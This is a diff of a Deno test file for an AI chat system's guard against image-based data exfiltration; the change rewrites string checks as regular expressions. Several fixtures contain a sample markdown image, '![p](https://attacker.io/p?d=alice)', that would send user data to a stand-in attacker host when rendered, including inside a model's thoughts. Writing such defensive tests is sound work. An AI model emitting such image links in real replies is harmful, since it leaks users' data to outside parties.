@@ -124,7 +124,7 @@ Deno.test('image exfil: images from the system prompt and the user render', asyn
 
 Deno.test('image exfil: an image carrying data to a URL nobody gave the model is withheld', async () => {
   const { text, imageBlocked } = await run(lookupThen('![p](https://attacker.io/p?d=alice)'));
-  assertEquals([imageBlocked, text.includes('attacker.io')], [true, false]);
+  assertEquals([imageBlocked, /attacker\.io/.test(text)], [true, false]);
 });
 
 Deno.test('image exfil: a URL the model wrote itself earlier in the turn is not given to it', async () => {
@@ -147,7 +147,7 @@ Deno.test('image exfil: a thought loading an unseen image loses it, and the turn
       imageBlocked,
       thoughtOmitted,
       text,
-      thought.includes('attacker.io'),
+      /attacker\.io/.test(thought),
       thought.includes(OMIT_IMAGE),
     ],
     [false, true, 'Done.', false, true],
@@ -219,7 +219,7 @@ Deno.test('image exfil: a Live reply and its transcript render an image a tool r
   const shown = await liveReply(`![photo](${PHOTO})`);
   assertEquals([shown.imageBlocked, shown.text.includes(PHOTO)], [false, true]);
   const leaked = await liveReply('![p](https://attacker.io/p?d=alice)');
-  assertEquals([leaked.imageBlocked, leaked.text.includes('attacker.io')], [true, false]);
+  assertEquals([leaked.imageBlocked, /attacker\.io/.test(leaked.text)], [true, false]);
 });
 
 Deno.test('image exfil: a Live thought loading an unseen image loses it, and the reply goes on', async () => {
@@ -229,7 +229,7 @@ Deno.test('image exfil: a Live thought loading an unseen image loses it, and the
       shown.imageBlocked,
       shown.thoughtOmitted,
       shown.text.includes('All set.'),
-      shown.thought.includes('attacker.io'),
+      /attacker\.io/.test(shown.thought),
     ],
     [false, true, true, false],
   );
